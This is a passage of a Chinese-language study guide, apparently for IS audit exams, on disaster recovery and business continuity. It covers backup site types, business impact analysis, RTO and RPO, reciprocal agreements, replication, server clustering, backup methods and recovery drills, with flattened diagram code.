-->|\"增加数据同步\"| C style A fill:#bbdefb,stroke:#1976d2 style B fill:#fff9c4,stroke:#f57c00 style C fill:#ffcdd2,stroke:#c62828 🧊 冷站（Cold Site） 💡 冷站定义冷站只提供支持信息处理设备运行的基本环境，包括电线、空调和地板，但不包括计算机和通讯设备。 特点： ✅ 提供基础设施：电力、空调、地板 ❌ 不包含计算机设备 ❌ 不包含通讯设备 💰 成本最低 ⏱️ 恢复时间最长 适用场景： 预算有限的组织 对恢复时间要求不高的业务 作为长期灾难恢复的备选方案 🌡️ 温站（Warm Site） 💡 温站定义温站在冷站基础上增加了一些外部设备和网络连接，如备份恢复设备、UPS等。 特点： ✅ 包含冷站的所有设施 ✅ 配备备份恢复设备 ✅ 配备UPS（不间断电源） ✅ 具备网络连接 ❌ 不包含实时数据同步 💰 成本适中 ⏱️ 恢复时间中等 适用场景： 需要平衡成本和恢复时间的组织 中等规模的业务系统 可接受数小时到数天恢复时间的业务 🔥 热站/镜像站点（Hot Site/Mirror Site） 💡 热站定义镜像站点是专门能够备份关键应用的站点，具备完整的设备和实时数据同步能力。 特点： ✅ 完整的计算机设备 ✅ 完整的通讯设备 ✅ 实时或近实时数据同步 ✅ 可立即接管业务 💰 成本最高 ⏱️ 恢复时间最短（分钟级） 适用场景： 关键业务系统 金融交易系统 不能容忍长时间中断的业务 电子资金转账（EFT）等实时系统 备份站点选址与管理 📍 选址原则 ⚠️ 关键原则备份站点不应当部署在离原业务系统所在地较近的地方。 选址考虑因素： 地理距离 ❌ 不能太近：避免同一灾难影响两个站点 ✅ 适当距离：确保不受相同区域性灾难影响 考虑自然灾害范围（地震、洪水、台风等） 可达性 不应过于显眼或容易被找到 需要保护免受有意破坏 应有安全的访问路径 基础设施 稳定的电力供应 可靠的网络连接 适当的环境条件 🔐 物理访问控制 ✅ 正确做法备份站点应与原业务系统具有同样的物理访问控制措施。 访问控制要求： 身份验证：与主站点相同的认证机制 授权管理：严格的权限控制 监控记录：完整的访问日志 环境监控：与源站点相同的监控等级 常见误区： ❌ 认为备份站点不常用，可以降低安全标准 ✅ 备份站点应保持与主站点相同的安全等级 ❌ 为便于紧急使用而降低访问门槛 ✅ 应通过预授权和应急流程确保合法访问 灾难恢复计划制定 制定流程 graph TD A[\"开始制定灾难恢复计划\"] B[\"执行业务影响分析Business Impact Analysis\"] C[\"业务经理定义流程优先级\"] D[\"识别关键系统和应用\"] E[\"制定恢复策略\"] F[\"明确恢复团队和职责\"] G[\"编制恢复手册\"] H[\"测试和演练\"] A --> B B --> C C --> D D --> E E --> F F --> G G --> H style B fill:#ffcdd2,stroke:#c62828 style C fill:#ffcdd2,stroke:#c62828 第一步：业务影响分析 🎯 最重要的第一步在准备灾难恢复计划时，应该首先实施的步骤是执行业务影响分析（BIA）。 业务影响分析的目的： 识别关键业务流程 确定哪些业务流程对组织最重要 评估业务中断的影响 计算可接受的停机时间 评估资源需求 确定恢复所需的资源 评估恢复成本 制定预算计划 确定恢复优先级 根据业务重要性排序 定义恢复时间目标（RTO） 定义恢复点目标（RPO） 优先级定义 👔 业务经理的职责业务经理应当在灾难前定义流程优先级，确定哪些系统是关键的。 为什么由业务经理定义？ 业务理解：业务经理最了解业务需求 影响评估：能够准确评估业务中断的影响 资源分配：有权决定资源投入优先级 责任明确：业务经理对业务连续性负责 常见误区： ❌ 由信息系统经理指派流程优先级 ✅ 信息系统经理应支持业务经理的决策 ❌ 等到灾难发生时再决定优先级 ✅ 必须在灾难前完成优先级定义 ❌ 所有系统同等重要 ✅ 必须明确区分关键和非关键系统 恢复策略制定 策略制定的优先考虑因素 🎯 首要评估因素制定灾难恢复策略时，必须最先评估的是：一个可以实现的成本效益，内置的复原恢复时间。 为什么成本效益是首要考虑？ 首先评估信息资产能否更有效地从灾难中恢复，例如： 不同的行程安排 预备路径 多条通信载体 常见误区： ❌ 认为可以完全移除所有威胁 ✅ 移除现有和未来的所有威胁是不现实的 ❌ 只关注优化恢复时间 ✅ 最佳恢复时间是为了减少后续损失，但需要平衡成本 ❌ 只关注最小化恢复成本 ✅ 需要在恢复时间和成本之间找到平衡点 业务影响分析（BIA）中的优先级 📋 BIA首要任务在业务影响分析中，应该最先确认：根据恢复优先级设定的重要业务流程。 BIA执行顺序： graph TD A[\"开始BIA\"] B[\"1. 识别重要业务流程根据恢复优先级设定\"] C[\"2. 评估组织风险单点失败、设备风险\"] D[\"3. 识别业务流程威胁\"] E[\"4. 确定重建所需资源\"] A --> B B --> C C --> D D --> E style B fill:#ffcdd2,stroke:#c62828 为什么这个顺序很重要？ 首先：识别关键业务流程的恢复优先级 其次：评估组织风险（如单点失败或设备风险） 接着：识别对关键业务流程的威胁 最后：确定重建业务所需的资源 BIA对恢复策略的影响 🔄 策略选择基础企业影响分析可以用来识别关键业务流程和相应的支持程序，它主要会影响到恢复策略的选择。 BIA如何影响决策： 最适当的策略选定是建立在以下基础上： 相对的风险水平 在企业影响分析中已识别的危险程度 BIA之后才能确定的内容： 维护业务连续性计划的职责 选择站点恢复供应商的条件 关键人员的职责 这些都是在恢复策略选择或适当的恢复策略设计后才作出的决定。 针对不同系统的策略 关键系统示例：电子资金转账（EFT）系统 💳 EFT系统恢复策略对于拥有电子资金转账销售点设备的大型连锁商场，中央通信处理器的最佳灾难恢复方案是在另外的网络节点选择备份程序。 为什么选择网络节点备份？ 单点故障风险 中央通信处理器失效会中断所有商店的操作 可能由设备、电力、通信故障引起 影响范围广，损失巨大 各种方案对比 方案 优点 缺点 适用性 每日备份离线存储 成本低 ❌ EFT是在线处理，离线存储无法替代功能 不适用 在线备份处理器 可应对设备故障 ❌ 无法应对电力或通信故障 部分适用 双通讯设备 可应对通信链路故障 ❌ 无法应对设备或电力故障 部分适用 另一网络节点备份 ✅ 可应对所有类型故障 成本较高 最佳方案 网络节点备份的优势 地理分散：不受单一地点灾难影响 独立电力：不受主站点电力故障影响 独立通信：不受主站点通信故障影响 快速切换：可实现自动故障转移 恢复时间目标（RTO）与成本分析 RTO的影响 ⏱️ RTO与容忍度的关系如果恢复时间目标（RTO）增加，则灾难容忍度增加。 RTO增加的影响： graph LR A[\"RTO增加\"] B[\"灾难容忍度增加\"] C[\"恢复成本降低\"] A --> B A --> C style A fill:#bbdefb,stroke:#1976d2 style B fill:#c8e6c9,stroke:#388e3d style C fill:#c8e6c9,stroke:#388e3d 关键理解： ✅ RTO越长 → 灾难容忍度越高 ✅ RTO越长 → 恢复成本越低 ❌ 不能得出结论：不能使用冷备援计算机中心 ❌ 不能得出结论：数据备份频率必须增加 实际应用： RTO 灾难容忍度 恢复成本 适用站点类型 短（分钟级） 低 高 热站/镜像站点 中（小时级） 中 中 温站 长（天级） 高 低 冷站 恢复时间的成本考虑 💰 全面的成本分析在计算可接受的关键业务流程恢复时间时，停机时间成本和恢复操作成本都需要考虑。 成本分析框架： graph TB A[\"总成本\"] B[\"停机成本\"] C[\"恢复操作成本\"] D[\"直接成本\"] E[\"间接成本\"] A --> B A --> C B --> D B --> E D --> D1[\"现金流出\"] D --> D2[\"人员工资\"] D --> D3[\"设备租赁\"] E --> E1[\"客户流失\"] E --> E2[\"声誉损失\"] E --> E3[\"市场份额损失\"] style A fill:#e3f2fd,stroke:#1976d2 style B fill:#fff3e0,stroke:#f57c00 style C fill:#fff3e0,stroke:#f57c00 style E fill:#ffcdd2,stroke:#c62828 1. 停机成本 直接成本： 现金流出费用 继续支付的人员工资 临时解决方案费用 间接成本（往往更重要）： 客户流失 供应商信任度下降 声誉和市场份额损失 可能威胁业务生存能力 ⚠️ 重要提醒间接的停机成本不能被忽略。一个严重中断正常商业活动的间接损失，随着时间的推移，可能比直接损失更重要，甚至威胁业务生存能力。 2. 恢复操作成本 备份站点的建设和维护 冗余设备的投资 数据备份和传输成本 人员培训和演练费用 3. 最佳平衡点 ⚖️ 寻找平衡业务影响分析（BIA）的结果应该是一个代表了最佳平衡的恢复策略。 平衡原则： 信息资产越快被恢复，停机成本越小 但快速恢复需要更多冗余能力投资 不应为不重要的业务流程投入过多恢复资源 停机成本不能被孤立地看待 常见误区： ❌ 只需考虑停机时间的成本 ✅ 必须同时考虑停机成本和恢复操作成本 ❌ 只需分析恢复操作的成本 ✅ 恢复操作成本不能单独确定可接受的恢复时间 ❌ 可以忽略间接的停机成本 ✅ 间接成本往往比直接成本更重要 业务连续性计划的有效性特性 计划的三个核心特性 🛡️ 有效BCP的三大支柱一个有效的业务连续性计划包括三个核心特性：防止（Prevention）、减轻（Mitigation）、恢复（Recovery）。 graph LR A[\"业务连续性计划\"] B[\"防止Prevention\"] C[\"减轻Mitigation\"] D[\"恢复Recovery\"] A --> B A --> C A --> D B --> B1[\"防火墙\"] B --> B2[\"访问控制\"] B --> B3[\"安全策略\"] C --> C1[\"定期备份\"] C --> C2[\"数据复制\"] C --> C3[\"冗余系统\"] D --> D1[\"热站恢复\"] D --> D2[\"业务切换\"] D --> D3[\"系统重建\"] style A fill:#e3f2fd,stroke:#1976d2 style B fill:#c8e6c9,stroke:#388e3d style C fill:#fff9c4,stroke:#f57c00 style D fill:#ffcdd2,stroke:#c62828 1. 防止（Prevention） 目标： 防止灾难发生 典型措施： 🔥 安装防火墙 🔐 实施访问控制 🛡️ 部署入侵检测系统 ⚡ 安装UPS和发电机 🌊 物理防护措施（防洪、防震） 特点： 主动性措施 降低灾难发生概率 长期投资 2. 减轻（Mitigation） 目标： 减轻灾难产生的影响 💾 减轻措施的核心周期性备份数据和软件文件是减轻措施的典型例子，确保文件能够按照有效的恢复计划及时得到恢复。 典型措施： 💾 定期数据备份 🔄 实时数据复制 🖥️ 冗余系统部署 📡 多路通信链路 🏢 异地备份站点 特点： 降低灾难影响程度 缩短恢复时间 减少数据丢失 审计验证点： 当IS审计师观察到组织的数据和软件文件被周期性备份时，这证明了计划的减轻特性。 3. 恢复（Recovery） 目标： 灾难后恢复正常业务运营 典型措施： 🔥 使用热站恢复业务运营 🔄 激活备份系统 📋 执行恢复程序 👥 召集恢复团队 🔧 重建受损系统 特点： 灾难发生后执行 恢复业务功能 最小化停机时间 三个特性的关系 特性 时间点 目标 典型措施 成本 防止 灾难前 避免灾难发生 防火墙、访问控制 中等 减轻 灾难前+灾难中 降低影响程度 数据备份、冗余系统 中高 恢复 灾难后 恢复正常运营 热站切换、系统重建 高 恢复优先级管理 业务流程恢复优先级 🎯 最高优先级在业务连续性计划中，恢复关键流程具有最高的优先级。 为什么关键流程优先？ 关键流程的恢复能使业务在中断后迅速开始，且不会晚于公告的中断平均时间（MTD - Maximum Tolerable Downtime）。 流程类型与优先级 graph TD A[\"业务流程分类\"] B[\"关键流程Critical Processes\"] C[\"敏感流程Sensitive Processes\"] D[\"一般流程Normal Processes\"] A --> B A --> C A --> D B --> B1[\"最高优先级\"] B --> B2[\"必须立即恢复\"] B --> B3[\"自动化恢复\"] C --> C1[\"中等优先级\"] C --> C2[\"可容忍延迟\"] C --> C3[\"可手工执行\"] D --> D1[\"低优先级\"] D --> D2[\"可延后恢复\"] D --> D3[\"灵活处理\"] style B fill:#ffcdd2,stroke:#c62828 style C fill:#fff9c4,stroke:#f57c00 style D fill:#c8e6c9,stroke:#388e3d 1. 关键流程（最高优先级） 特征： ⚡ 必须立即恢复 💰 业务生存依赖 ⏱️ 不能容忍长时间中断 🤖 需要自动化恢复 示例： 金融交易处理 电子商务订单系统 生产控制系统 客户服务热线 2. 敏感流程（中等优先级） 特征： ⏳ 可在更长时间范围内恢复 💵 在可容忍成本下可手工执行 📋 不标识为高优先级 🔄 可采用临时替代方案 示例： 报表生成系统 数据分析平台 内部管理系统 非关键业务流程 3. 站点恢复与重新部署（低优先级） 为什么优先级较低？ ⏱️ 时间消耗以下操作需要消耗大量时间，不具有高优先级： 维修和恢复站点到初始状态 将运行过程重新部署到替代站点 恢复物理环境 这些操作的特点： 🏗️ 需要大量时间和资源 🔧 涉及物理设施修复 📦 可能需要设备采购和安装 👷 需要专业团队协调 恢复顺序： 第一阶段：恢复关键流程（使用备份站点） 第二阶段：恢复敏感流程 第三阶段：评估原站点损坏情况 第四阶段：决定修复或重新部署 第五阶段：逐步迁移回原站点或新站点 恢复策略选择：灾难容忍度与RTO/RPO 核心概念理解 📊 关键指标定义 灾难容忍度：业务能承诺不使用IT设备的时间间隔 RTO（恢复时间目标）：系统恢复到可用状态的目标时间 RPO（恢复点目标）：可接受的数据恢复的最近时间点 graph TB A[\"恢复策略选择\"] B[\"评估灾难容忍度\"] C[\"确定RTO\"] D[\"确定RPO\"] E[\"选择恢复策略\"] A --> B B --> C B --> D C --> E D --> E E --> E1[\"热站/镜像\"] E --> E2[\"温站\"] E --> E3[\"冷站\"] style A fill:#e3f2fd,stroke:#1976d2 style E1 fill:#ffcdd2,stroke:#c62828 style E2 fill:#fff9c4,stroke:#f57c00 style E3 fill:#bbdefb,stroke:#1976d2 热站使用场景 🔥 何时使用热站热站作为恢复策略应在低灾难容忍度的情况下执行。 热站适用条件： 指标 要求 说明 灾难容忍度 低 业务不能容忍长时间中断 RTO 低（分钟级） 需要快速恢复 RPO 低 不能容忍数据丢失 业务重要性 极高 关键业务系统 成本承受能力 高 能够承担高昂成本 为什么低灾难容忍度需要热站？ ⚡ 时间间隔低，必须在短期内执行恢复策略 🔥 热站可以立即接管业务 💰 虽然成本高，但业务损失更大 🎯 满足严格的RTO要求 常见误区： ❌ 高RTO时使用热站 ✅ 高RTO表示可利用额外时间，应考虑温站或冷站 ❌ 高RPO时使用热站 ✅ 高RPO表示可等待较长时间，其他策略更经济 ❌ 高灾难容忍度时使用热站 ✅ 高容忍度意味着可以接受较长恢复时间，不需要热站 数据镜像使用场景 🪞 何时使用数据镜像数据镜像最适合在**低RPO（恢复点目标）**的情况下使用。 数据镜像适用条件： 指标 要求 说明 RPO 低 不能容忍数据丢失 数据重要性 极高 关键业务数据 实时性要求 高 需要实时或近实时同步 数据一致性 严格 必须保证数据完整性 为什么低RPO需要数据镜像？ RPO的含义 RPO体现了可接受的数据恢复的最近时间点 低RPO意味着只能容忍很少的数据丢失 需要实时或近实时的数据同步 数据镜像的优势 🔄 实时数据复制 💾 零或接近零的数据丢失 ⚡ 快速切换能力 ✅ 保证数据一致性 与其他方案对比 方案 RPO 数据丢失风险 适用场景 数据镜像 秒级 几乎为零 低RPO要求 实时复制 分钟级 极低 低RPO要求 定期备份（小时） 小时级 中等 中等RPO 定期备份（天） 天级 高 高RPO可接受 常见误区： ❌ 高RPO时使用数据镜像 ✅ 高RPO表示可接受较多数据丢失，定期备份即可 ❌ 混淆RTO和RPO ✅ RTO关注恢复时间，RPO关注数据丢失程度 ❌ 认为数据镜像只是备份 ✅ 数据镜像是实时同步，不仅仅是备份 恢复策略决策矩阵 根据灾难容忍度和RTO/RPO选择策略： 灾难容忍度 RTO RPO 推荐策略 数据保护方案 低 低（分钟） 低（秒） 热站 数据镜像 低 低（分钟） 中（分钟） 热站 实时复制 中 中（小时） 低（秒） 温站 数据镜像 中 中（小时） 中（分钟） 温站 定期备份（频繁） 高 高（天） 高（小时） 冷站 定期备份（日常） 决策流程： graph TD A[\"开始选择恢复策略\"] B{\"灾难容忍度？\"} C{\"RPO要求？\"} D{\"RTO要求？\"} E[\"热站 + 数据镜像\"] F[\"温站 + 实时复制\"] G[\"冷站 + 定期备份\"] A --> B B -->|低| C B -->|中| D B -->|高| G C -->|低| E C -->|中高| F D -->|低| F D -->|高| G style E fill:#ffcdd2,stroke:#c62828 style F fill:#fff9c4,stroke:#f57c00 style G fill:#bbdefb,stroke:#1976d2 互惠协议与备份站点共享 互惠协议的概念 🤝 互惠协议定义互惠协议（Reciprocal Agreement）是指两家公司相互同意在灾难发生时为对方提供备份设施和资源的协议。 互惠协议的优势： 💰 成本较低（共享资源） 🤝 互利互惠 🏢 适合规模相似的组织 互惠协议的劣势： ⚠️ 存在多种风险 📋 需要持续维护 🔄 依赖双方配合 互惠协议面临的最大风险 ⚠️ 最大风险各自的发展将导致（互相间）软硬件不兼容，这是互惠协议面临的最大风险。 为什么软硬件不兼容是最大风险？ 如果其中一个组织更新了软硬件配置，可能意味着将与互惠协议中另一方的系统不兼容。这将导致任意一家公司都将无法在灾难之后使用另一家的设施持续其业务操作。 graph TD A[\"公司A更新系统\"] B[\"软硬件配置变化\"] C[\"与公司B系统不兼容\"] D[\"灾难发生时\"] E[\"无法使用对方设施\"] F[\"业务无法恢复\"] A --> B B --> C C --> D D --> E E --> F style F fill:#ffcdd2,stroke:#c62828 互惠协议的主要风险分析 风险类型 严重程度 可控性 说明 软硬件不兼容 🔴 最高 难以控制 各自发展导致系统差异，灾难时无法使用 资源未必可用 🟡 中等 契约约束 内在风险但可通过合同管理 无法演练 🟢 较低 可以解决 可通过纸上推演或协商演练 安全架构差异 🟢 较低 可以协调 不是不可避免的风险 1. 软硬件不兼容（最大风险） 风险场景： 🖥️ 操作系统版本不同 💾 数据库系统不兼容 🔌 硬件架构差异 📡 网络协议不匹配 🔧 应用软件版本冲突 影响： ❌ 无法运行关键应用 ❌ 数据无法迁移 ❌ 系统无法启动 ❌ 业务完全中断 为什么难以控制： 各公司有自己的IT发展规划 技术更新换代是必然趋势 难以要求对方停止升级 同步更新成本高昂 2. 资源未必可用（中等风险） 风险特点： 📋 这是任何互惠协议的内在风险 📝 属于契约问题而非最大风险 ⚖️ 可通过法律约束管理 可能情况： 对方也发生灾难 对方资源已被占用 对方业务扩张资源不足 对方违约不提供资源 缓解措施： 明确合同条款 定期审查资源可用性 建立违约责任机制 考虑多方互惠协议 3. 恢复计划无法演练（较低风险） 为什么风险较低： 📄 可以通过纸上推演进行 🤝 两家公司间互相同意的话也可能进行演练 📅 可以安排非高峰时段测试 🔄 可以分阶段逐步演练 解决方案： 定期桌面演练 协商安排实际演练 使用虚拟化技术模拟 建立演练计划表 4. 安全基础架构差异（较低风险） 为什么风险较低： 🔧 不是不可避免的风险 🤝 可以通过协调统一 📋 可以制定共同标准 🔒 可以建立安全互信机制 管理措施： 制定统一安全标准 定期安全审计 建立安全互信机制 协调安全策略 互惠协议的最佳实践 💡 降低风险的建议技术兼容性管理： 📋 制定技术标准协议 🔄 定期同步技术路线图 🧪 定期进行兼容性测试 📢 重大变更提前通知 资源保障： 📝 明确资源预留条款 💰 建立补偿机制 🔍 定期审查资源状态 🆘 建立紧急联系机制 演练与测试： 📅 制定年度演练计划 🖥️ 使用虚拟化技术 📊 记录演练结果 🔧 持续改进流程 互惠协议的替代方案 当互惠协议风险过高时，考虑： 商业备份服务 专业服务提供商 标准化环境 服务等级协议保障 云备份服务 灵活可扩展 按需付费 快速部署 自建备份站点 完全控制 无兼容性问题 成本较高 关键数据库恢复策略 完整恢复策略对比 🎯 最适合的策略如果数据中心发生灾难，完整恢复关键数据库的最适合策略是：实时复制到异地。 各种策略对比： 策略 数据完整性 恢复速度 地理保护 适用性 推荐度 实时复制到异地 ✅ 完整 ⚡ 即时 ✅ 保护 关键数据库 ⭐⭐⭐⭐⭐ 每日备份到异地磁带 ❌ 丢失当天数据 🐌 慢 ✅ 保护 一般数据 ⭐⭐⭐ 镜像到本地服务器 ✅ 完整 ⚡ 快 ❌ 无保护 本地故障 ⭐⭐ 实时备份到本地网格 ✅ 完整 ⚡ 快 ❌ 无保护 本地故障 ⭐⭐ 实时异地复制的优势 🌐 双活数据中心有了实时的远程地址复制功能，数据能在两个单独的区域同时更新，因此一个点的灾难将不会破坏远程站点上的信息。 核心优势： 数据完整性保障 📊 两个地点同时更新 🔄 实时同步 ✅ 零数据丢失（RPO=0） 🎯 数据一致性 地理灾难保护 🌍 两个单独区域 🛡️ 一个点的灾难不影响另一个点 🏢 区域性灾难保护 🌊 自然灾害隔离 快速恢复能力 ⚡ 即时切换 🔄 自动故障转移 ⏱️ RTO接近零 🚀 业务连续性 其他策略的局限性 每日备份到异地磁带 局限性： ❌ 会丢失当天的数据 🐌 恢复时间长 📼 磁带读取速度慢 🚚 需要物理运输 适用场景： 非关键数据 可接受数据丢失 预算有限 长期归档需求 镜像到本地服务器 局限性： ❌ 在同一个数据中心 🔥 会受同样的灾难影响 🌊 无地理保护 ⚡ 只能防止单个服务器故障 适用场景： 硬件故障保护 快速本地切换 非灾难恢复场景 实时备份到本地网格存储 局限性： ❌ 在同一个数据中心 🔥 会受同样的灾难影响 🏢 无地理隔离 💥 整个数据中心灾难时无效 适用场景： 数据保护 快速恢复 非灾难场景 实施实时异地复制的考虑因素 技术要求： 🌐 高速网络连接 💾 充足的存储容量 🖥️ 相同的硬件配置 🔧 兼容的软件版本 成本考虑： 💰 双倍基础设施投资 📡 网络带宽成本 👥 运维人员成本 🔄 同步机制成本 性能影响： ⏱️ 网络延迟 📊 同步开销 🔄 事务处理影响 ⚖️ 需要权衡一致性和性能 高可用性网络设计 单点故障风险 ⚠️ 最高风险在评估高可用性网络的恢复能力时，网络服务器位于同一地点的风险最高。 为什么同地点部署风险最高？ 网络服务器群集安装在同一个地点的设置，会导致整个网络的脆弱性，形成灾难或其他破坏性事件的单点故障。 graph TD A[\"所有服务器在同一地点\"] B[\"单点故障风险\"] C[\"灾难发生\"] D[\"所有服务器同时失效\"] E[\"整个网络瘫痪\"] A --> B B --> C C --> D D --> E style A fill:#ffcdd2,stroke:#c62828 style E fill:#ffcdd2,stroke:#c62828 高可用性网络配置对比 配置方式 地理保护 单点故障 恢复能力 风险等级 服务器同一地点 ❌ 无 ✅ 存在 🔴 差 最高 设备地理分散 ✅ 有 ❌ 无 🟢 优 低 不同路由 ✅ 有 ❌ 无 🟢 优 低 热站就绪 ✅ 有 ❌ 无 🟢 优 低 降低风险的配置方案 1. 设备地理位置分散 优势： 🌍 地理隔离保护 🛡️ 区域性灾难不影响全部 🔄 自动故障转移 📍 多点服务能力 实施要点： 选择不同地理区域 考虑自然灾害分布 确保网络互联 配置负载均衡 2. 网络执行不同路由 优势： 🛤️ 路径冗余 🔄 自动路由切换 📡 通信链路保护 ⚡ 快速恢复 实施要点： 多条物理路径 不同运营商 动态路由协议 链路监控 3. 热站就绪可被激活 优势： 🔥 即时切换能力 🎯 单点故障时的替代方案 ⚡ 快速恢复 🔄 业务连续性 实施要点： 保持热站同步 定期测试切换 自动化故障转移 监控热站状态 分布式环境中的容错设计 服务器集群的重要性 🖥️ 最佳容错方案在分布式环境中，服务器集群能够最大程度减轻服务器故障的影响。 服务器集群工作原理： 服务器集群使得两个或两个以上的服务器作为一个单元来工作，因此其中一个发生故障时，其他的服务器依旧可以正常工作。 graph LR A[\"服务器1\"] B[\"服务器2\"] C[\"服务器3\"] D[\"负载均衡器\"] E[\"用户请求\"] E --> D D --> A D --> B D --> C A -.\"故障\".-> F[\"X\"] B --> G[\"继续服务\"] C --> G style F fill:#ffcdd2,stroke:#c62828 style G fill:#c8e6c9,stroke:#388e3d 容错方案对比 方案 针对问题 容错能力 适用场景 推荐度 服务器集群 服务器故障 ✅ 高 分布式环境 ⭐⭐⭐⭐⭐ 冗余路径 通信中断 ✅ 中 网络故障 ⭐⭐⭐⭐ 拨号备份链路 通信中断 ✅ 中 网络故障 ⭐⭐⭐ 备份电源 电源故障 ✅ 中 电力中断 ⭐⭐⭐⭐ 各种容错方案详解 1. 服务器集群（针对服务器故障） 核心优势： 🖥️ 多服务器协同工作 🔄 自动故障转移 ⚖️ 负载均衡 📈 可扩展性 集群类型： 主动-主动集群：所有节点同时工作 主动-被动集群：备用节点待命 N+1集群：N个工作节点+1个备用 实施要点： 共享存储或数据同步 心跳检测机制 会话保持 健康检查 2. 冗余路径（针对通信中断） 目的： 📡 最小化通信中断影响 🛤️ 提供备用通信路径 🔄 自动路由切换 局限性： ❌ 不针对服务器故障 ✅ 只解决网络问题 3. 拨号备份链路（针对通信中断） 目的： 📞 提供备用通信方式 🔄 主链路故障时启用 💰 成本较低 局限性： ❌ 不针对服务器故障 🐌 速度较慢 ⏱️ 切换需要时间 4. 备份电源（针对电源故障） 目的： ⚡ 提供电力故障时的替代电源 🔋 UPS短期供电 🏭 发电机长期供电 局限性： ❌ 不针对服务器故障 ✅ 只解决电力问题 综合容错架构设计 🏗️ 完整的容错架构多层次容错设计： 应用层：服务器集群 网络层：冗余路径 + 拨号备份 基础设施层：备份电源 + 环境监控 数据层：实时异地复制 站点层：地理分散部署 设计原则： 🎯 消除单点故障 🔄 自动故障转移 📊 实时监控告警 🧪 定期测试验证 📈 可扩展架构 数据传输与交易有效性 实时数据传输的重要性 💾 保证交易有效性当发生灾难时，保证业务交易有效性的方法是：从当前区域外的地方实时传送交易磁带。 各种传输方案对比： 传输方式 频率 数据完整性 适用场景 推荐度 实时传送 实时 ✅ 包含所有交易 关键交易系统 ⭐⭐⭐⭐⭐ 每小时传送 1小时/次 ❌ 可能丢失部分交易 一般业务系统 ⭐⭐⭐ 每天传送 1天/次 ❌ 可能丢失大量交易 非关键系统 ⭐⭐ 整合存储设备 不定期 ❌ 外部区域无法保证 不适用 ⭐ 为什么实时传送是唯一选择？ 完整性保证 实时传送是保证所有交易有效性的唯一办法 任何延迟都可能导致交易数据丢失 非实时方案的问题 每小时传送：不是实时的，不能包含全部交易 每天传送：延迟更大，丢失风险更高 整合存储：在外部区域不能保证有效性 关键业务要求 金融交易系统 电子商务平台 实时支付系统 任何不能容忍数据丢失的业务 实施要点： ✅ 选择当前区域外的地点 ✅ 确保实时或近实时传输 ✅ 建立冗余传输通道 ✅ 定期测试传输和恢复 ✅ 监控传输状态和数据完整性 数据备份策略 数据备份类型 💾 数据备份分类数据备份按数据类型划分为系统数据备份和用户数据备份。 数据备份分类体系： graph TB A[\"数据备份分类\"] B[\"按数据类型\"] C[\"按备份方式\"] D[\"按备份位置\"] A --> B A --> C A --> D B --> B1[\"系统数据备份\"] B --> B2[\"用户数据备份\"] C --> C1[\"完全备份\"] C --> C2[\"增量备份\"] C --> C3[\"差异备份\"] D --> D1[\"本地备份\"] D --> D2[\"异地备份\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d style D fill:#fff3e0,stroke:#f57c00 1. 按数据类型分类 系统数据备份 vs 用户数据备份： 类型 内容 目的 恢复优先级 示例 系统数据备份 操作系统、应用程序、配置文件 恢复系统运行环境 高 OS镜像、数据库系统、应用配置 用户数据备份 业务数据、用户文件、数据库内容 恢复业务数据 最高 业务数据库、用户文档、交易记录 系统数据备份： 🖥️ 操作系统文件 ⚙️ 系统配置 📦 应用程序 🔧 系统设置 📋 系统日志 用户数据备份： 📊 业务数据库 📄 用户文档 💰 交易记录 👤 用户信息 📈 业务报表 2. 按备份方式分类 三种备份方式对比： graph LR A[\"完全备份\"] B[\"差异备份\"] C[\"增量备份\"] A -->|\"基准\"| B A -->|\"基准\"| C B -->|\"累积变化\"| B C -->|\"每次变化\"| C style A fill:#e3f2fd,stroke:#1976d2 style B fill:#fff3e0,stroke:#f57c00 style C fill:#e8f5e9,stroke:#388e3d 备份方式 备份内容 备份速度 恢复速度 存储空间 适用场景 完全备份 所有数据 🐌 慢 ⚡ 快 💾 大 定期基准备份 差异备份 自上次完全备份后的变化 🚶 中等 🚶 中等 💿 中等 每日备份 增量备份 自上次任何备份后的变化 ⚡ 快 🐌 慢 💽 小 频繁备份 完全备份（Full Backup）： 📦 备份所有选定的数据 ⏱️ 时间最长 💾 占用空间最大 ⚡ 恢复最简单快速 🎯 作为其他备份的基准 差异备份（Differential Backup）： 📊 备份自上次完全备份后更新的全部数据文件 ⏱️ 时间适中 💿 占用空间逐渐增加 🔄 恢复需要：完全备份 + 最后一次差异备份 📅 适合每日备份策略 ⚠️ 常见误区错误理解：增量备份是备份从上次完全备份后更新的全部数据文件 ✅ 正确理解： 差异备份：从上次完全备份后的所有变化 增量备份：从上次任何备份（完全或增量）后的变化 区别示例： 周日：完全备份（100GB） 周一：变化10GB 周二：变化15GB 周三：变化12GB 差异备份策略： - 周一差异：10GB（周日后的变化） - 周二差异：25GB（周日后的所有变化） - 周三差异：37GB（周日后的所有变化） 增量备份策略： - 周一增量：10GB（周日后的变化） - 周二增量：15GB（周一后的变化） - 周三增量：12GB（周二后的变化） 增量备份（Incremental Backup）： 📈 备份自上次任何备份后的变化 ⚡ 时间最短 💽 占用空间最小 🐌 恢复最复杂：完全备份 + 所有增量备份 🔄 适合频繁备份 3. 备份策略选择 综合备份策略示例： 备份计划（推荐）： ├── 每周日：完全备份 ├── 周一至周六：增量备份或差异备份 └── 每月：完整归档备份 恢复场景： ├── 使用差异备份恢复（周三故障） │ └── 需要：周日完全备份 + 周二差异备份 │ └── 使用增量备份恢复（周三故障） └── 需要：周日完全备份 + 周一增量 + 周二增量 选择建议： 场景 推荐方式 原因 数据变化量大 增量备份 节省存储空间和备份时间 需要快速恢复 差异备份 恢复只需两个备份集 关键系统 完全备份 恢复最可靠 混合策略 完全+增量/差异 平衡效率和可靠性 容灾演练的重要性 ⚠️ 持续演练的必要性即使系统在一段时间内没有出现问题，也必须定期进行容灾演练。 为什么必须持续演练： 验证计划有效性 环境可能已经变化 系统配置可能更新 人员可能变动 流程可能过时 保持团队熟练度 恢复团队需要保持技能 新成员需要培训 流程需要熟悉 协调需要练习 发现潜在问题 未测试的计划可能存在缺陷 新的单点故障 资源不足 流程瓶颈 适应变化 业务需求变化 技术环境更新 威胁形势演变 合规要求变化 演练频率建议： 系统重要性 演练频率 演练类型 关键系统 季度 完整演练 重要系统 半年 完整演练 一般系统 年度 完整演练 所有系统 月度 桌面演练 演练类型： 📋 桌面演练：理论推演，讨论流程 🧪 功能测试：测试特定功能或组件 🔄 部分演练：测试部分恢复流程 🎯 完整演练：完整的灾难恢复测试 业务连续性测试 测试的重要性 ⚠️ 未测试计划的风险如果新的灾难恢复计划没有被测试，最主要的风险是灾难性的断电（服务中断）。 为什么测试如此重要？ 